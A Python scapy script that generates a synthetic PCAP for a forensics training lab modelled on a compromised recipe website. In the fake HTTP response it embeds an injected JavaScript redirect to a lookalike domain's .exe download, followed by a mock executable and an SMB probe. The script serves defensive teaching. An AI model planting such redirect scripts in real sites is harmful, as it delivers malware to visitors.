#!/usr/bin/env python3
"""
generate_lab_traffic.py - Synthetic Incident Network Traffic Generator

Generates a realistic forensic PCAP file simulating the Google Cybersecurity Certificate
Course 3 scenario + advanced packet inspection patterns:
1. Normal DNS resolution (yummyrecipesforme.com -> 192.0.2.10)
2. Normal TCP 3-way handshake with web server (192.0.2.10:80)
3. HTTP GET / index request & HTTP 200 OK response with malicious hidden JavaScript
4. Malicious client redirection via DNS (greatrecipesforme.com -> 198.51.100.25)
5. Attacker C2/Malware download session on port 80/8080
6. Attacker credential brute force / reconnaissance attempt
"""

import sys
import time
from datetime import datetime
from scapy.all import (
    wrpcap, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, Ether
)

def build_pcap(output_path: str):
    packets = []
    
    # Base network configuration
    client_ip = "192.168.1.105"
    client_mac = "00:0c:29:4f:8e:35"
    gateway_mac = "00:50:56:ea:bb:01"
    dns_server = "192.168.1.1"
    
    legit_server_ip = "192.0.2.10"
    malicious_server_ip = "198.51.100.25"
    
    base_time = 1715000000.0  # Simulated epoch timestamp
    
    def pkt_time(offset):
        return base_time + offset

    # ==========================================
    # 1. DNS QUERY & RESPONSE (Legitimate site)
    # ==========================================
    # Client asks for yummyrecipesforme.com
    dns_req = Ether(src=client_mac, dst=gateway_mac) / \
              IP(src=client_ip, dst=dns_server) / \
              UDP(sport=53421, dport=53) / \
              DNS(rd=1, qd=DNSQR(qname="yummyrecipesforme.com", qtype="A"))
    dns_req.time = pkt_time(0.000)
    packets.append(dns_req)
    
    # DNS Server responds with 192.0.2.10
    dns_resp = Ether(src=gateway_mac, dst=client_mac) / \
               IP(src=dns_server, dst=client_ip) / \
               UDP(sport=53, dport=53421) / \
               DNS(qr=1, aa=1, rd=1, ra=1,
                   qd=DNSQR(qname="yummyrecipesforme.com", qtype="A"),
                   an=DNSRR(rrname="yummyrecipesforme.com", type="A", rclass="IN", ttl=300, rdata=legit_server_ip))
    dns_resp.time = pkt_time(0.012)
    packets.append(dns_resp)

    # ==========================================
    # 2. TCP 3-WAY HANDSHAKE (Legitimate site)
    # ==========================================
    client_port = 49152
    c_seq = 1000
    s_seq = 50000
    
    # [SYN]
    syn = Ether(src=client_mac, dst=gateway_mac) / \
          IP(src=client_ip, dst=legit_server_ip) / \
          TCP(sport=client_port, dport=80, flags="S", seq=c_seq, ack=0, window=64240)
    syn.time = pkt_time(0.035)
    packets.append(syn)
    c_seq += 1
    
    # [SYN, ACK]
    syn_ack = Ether(src=gateway_mac, dst=client_mac) / \
              IP(src=legit_server_ip, dst=client_ip) / \
              TCP(sport=80, dport=client_port, flags="SA", seq=s_seq, ack=c_seq, window=65535)
    syn_ack.time = pkt_time(0.058)
    packets.append(syn_ack)
    s_seq += 1
    
    # [ACK]
    ack = Ether(src=client_mac, dst=gateway_mac) / \
          IP(src=client_ip, dst=legit_server_ip) / \
          TCP(sport=client_port, dport=80, flags="A", seq=c_seq, ack=s_seq, window=64240)
    ack.time = pkt_time(0.060)
    packets.append(ack)

    # ==========================================
    # 3. HTTP GET & MALICIOUS RESPONSE (Compromised web server)
    # ==========================================
    http_req = (
        "GET /index.html HTTP/1.1\r\n"
        "Host: yummyrecipesforme.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    
    http_get_pkt = Ether(src=client_mac, dst=gateway_mac) / \
                   IP(src=client_ip, dst=legit_server_ip) / \
                   TCP(sport=client_port, dport=80, flags="PA", seq=c_seq, ack=s_seq, window=64240) / \
                   Raw(load=http_req.encode())
    http_get_pkt.time = pkt_time(0.065)
    packets.append(http_get_pkt)
    c_seq += len(http_req.encode())
    
    # Server ACKs the request
    server_ack = Ether(src=gateway_mac, dst=client_mac) / \
                 IP(src=legit_server_ip, dst=client_ip) / \
                 TCP(sport=80, dport=client_port, flags="A", seq=s_seq, ack=c_seq, window=65535)
    server_ack.time = pkt_time(0.088)
    packets.append(server_ack)
    
    # Server sends HTTP 200 OK containing compromised iframe / redirect script
    http_resp = (
        "HTTP/1.1 200 OK\r\n"
        "Date: Tue, 07 May 2024 10:00:00 GMT\r\n"
        "Server: Apache/2.4.41 (Ubuntu)\r\n"
        "Content-Type: text/html; charset=UTF-8\r\n"
        "Content-Length: 320\r\n"
        "Connection: keep-alive\r\n\r\n"
        "<!DOCTYPE html><html><head><title>Yummy Recipes</title></head><body>"
        "<h1>Delicious Home Recipes</h1>"
        "<p>Welcome to our kitchen!</p>"
        "<script type=\"text/javascript\">"
        "window.location.replace('http://greatrecipesforme.com/download/recipe_installer.exe');"
        "</script>"
        "</body></html>"
    )
    
    http_resp_pkt = Ether(src=gateway_mac, dst=client_mac) / \
                    IP(src=legit_server_ip, dst=client_ip) / \
                    TCP(sport=80, dport=client_port, flags="PA", seq=s_seq, ack=c_seq, window=65535) / \
                    Raw(load=http_resp.encode())
    http_resp_pkt.time = pkt_time(0.092)
    packets.append(http_resp_pkt)
    s_seq += len(http_resp.encode())
    
    # Client ACKs response
    client_ack = Ether(src=client_mac, dst=gateway_mac) / \
                 IP(src=client_ip, dst=legit_server_ip) / \
                 TCP(sport=client_port, dport=80, flags="A", seq=c_seq, ack=s_seq, window=64240)
    client_ack.time = pkt_time(0.105)
    packets.append(client_ack)

    # Client closes legit session [FIN, ACK]
    fin = Ether(src=client_mac, dst=gateway_mac) / \
          IP(src=client_ip, dst=legit_server_ip) / \
          TCP(sport=client_port, dport=80, flags="FA", seq=c_seq, ack=s_seq, window=64240)
    fin.time = pkt_time(0.120)
    packets.append(fin)
    c_seq += 1
    
    fin_ack = Ether(src=gateway_mac, dst=client_mac) / \
              IP(src=legit_server_ip, dst=client_ip) / \
              TCP(sport=80, dport=client_port, flags="FA", seq=s_seq, ack=c_seq, window=65535)
    fin_ack.time = pkt_time(0.135)
    packets.append(fin_ack)
    s_seq += 1
    
    final_ack = Ether(src=client_mac, dst=gateway_mac) / \
                IP(src=client_ip, dst=legit_server_ip) / \
                TCP(sport=client_port, dport=80, flags="A", seq=c_seq, ack=s_seq, window=64240)
    final_ack.time = pkt_time(0.136)
    packets.append(final_ack)

    # ==========================================
    # 4. MALICIOUS DNS LOOKUP (Redirect target)
    # ==========================================
    dns_bad_req = Ether(src=client_mac, dst=gateway_mac) / \
                  IP(src=client_ip, dst=dns_server) / \
                  UDP(sport=53422, dport=53) / \
                  DNS(rd=1, qd=DNSQR(qname="greatrecipesforme.com", qtype="A"))
    dns_bad_req.time = pkt_time(0.200)
    packets.append(dns_bad_req)
    
    dns_bad_resp = Ether(src=gateway_mac, dst=client_mac) / \
                   IP(src=dns_server, dst=client_ip) / \
                   UDP(sport=53, dport=53422) / \
                   DNS(qr=1, aa=1, rd=1, ra=1,
                       qd=DNSQR(qname="greatrecipesforme.com", qtype="A"),
                       an=DNSRR(rrname="greatrecipesforme.com", type="A", rclass="IN", ttl=60, rdata=malicious_server_ip))
    dns_bad_resp.time = pkt_time(0.215)
    packets.append(dns_bad_resp)

    # ==========================================
    # 5. TCP HANDSHAKE & PAYLOAD DOWNLOAD FROM ATTACKER
    # ==========================================
    bad_c_port = 49153
    bad_c_seq = 2000
    bad_s_seq = 80000
    
    # SYN
    p = Ether(src=client_mac, dst=gateway_mac) / \
        IP(src=client_ip, dst=malicious_server_ip) / \
        TCP(sport=bad_c_port, dport=80, flags="S", seq=bad_c_seq, ack=0, window=64240)
    p.time = pkt_time(0.230)
    packets.append(p)
    bad_c_seq += 1
    
    # SYN-ACK
    p = Ether(src=gateway_mac, dst=client_mac) / \
        IP(src=malicious_server_ip, dst=client_ip) / \
        TCP(sport=80, dport=bad_c_port, flags="SA", seq=bad_s_seq, ack=bad_c_seq, window=65535)
    p.time = pkt_time(0.252)
    packets.append(p)
    bad_s_seq += 1
    
    # ACK
    p = Ether(src=client_mac, dst=gateway_mac) / \
        IP(src=client_ip, dst=malicious_server_ip) / \
        TCP(sport=bad_c_port, dport=80, flags="A", seq=bad_c_seq, ack=bad_s_seq, window=64240)
    p.time = pkt_time(0.254)
    packets.append(p)
    
    # GET /download/recipe_installer.exe
    bad_http_get = (
        "GET /download/recipe_installer.exe HTTP/1.1\r\n"
        "Host: greatrecipesforme.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Accept: */*\r\n\r\n"
    )
    p = Ether(src=client_mac, dst=gateway_mac) / \
        IP(src=client_ip, dst=malicious_server_ip) / \
        TCP(sport=bad_c_port, dport=80, flags="PA", seq=bad_c_seq, ack=bad_s_seq, window=64240) / \
        Raw(load=bad_http_get.encode())
    p.time = pkt_time(0.260)
    packets.append(p)
    bad_c_seq += len(bad_http_get.encode())
    
    # Server sends malicious binary header (MZ executable mock header)
    mz_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.\r\nMALWARE_DROPPER_STAGER_ID_9921"
    bad_http_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx/1.18.0\r\n"
        b"Content-Type: application/x-msdownload\r\n"
        b"Content-Disposition: attachment; filename=\"recipe_installer.exe\"\r\n"
        b"Content-Length: " + str(len(mz_payload)).encode() + b"\r\n\r\n" + mz_payload
    )
    p = Ether(src=gateway_mac, dst=client_mac) / \
        IP(src=malicious_server_ip, dst=client_ip) / \
        TCP(sport=80, dport=bad_c_port, flags="PA", seq=bad_s_seq, ack=bad_c_seq, window=65535) / \
        Raw(load=bad_http_resp)
    p.time = pkt_time(0.310)
    packets.append(p)
    bad_s_seq += len(bad_http_resp)

    # ACK
    p = Ether(src=client_mac, dst=gateway_mac) / \
        IP(src=client_ip, dst=malicious_server_ip) / \
        TCP(sport=bad_c_port, dport=80, flags="A", seq=bad_c_seq, ack=bad_s_seq, window=64240)
    p.time = pkt_time(0.320)
    packets.append(p)

    # ==========================================
    # 6. ATTACKER RECONNAISSANCE & PORT PROBE (Bonus: Port Scan / Reset)
    # ==========================================
    # Attacker tries to connect to client port 445 (SMB) -> Rejected with RST
    probe_syn = Ether(src=gateway_mac, dst=client_mac) / \
                IP(src=malicious_server_ip, dst=client_ip) / \
                TCP(sport=42100, dport=445, flags="S", seq=99999, ack=0, window=1024)
    probe_syn.time = pkt_time(0.500)
    packets.append(probe_syn)
    
    probe_rst = Ether(src=client_mac, dst=gateway_mac) / \
                IP(src=client_ip, dst=malicious_server_ip) / \
                TCP(sport=445, dport=42100, flags="RA", seq=0, ack=100000, window=0)
    probe_rst.time = pkt_time(0.502)
    packets.append(probe_rst)

    # Write PCAP
    wrpcap(output_path, packets)
    print(f"[+] Successfully wrote {len(packets)} packets to {output_path}")

if __name__ == "__main__":
    out_file = "captures/incident_traffic.pcap"
    if len(sys.argv) > 1:
        out_file = sys.argv[1]
    build_pcap(out_file)
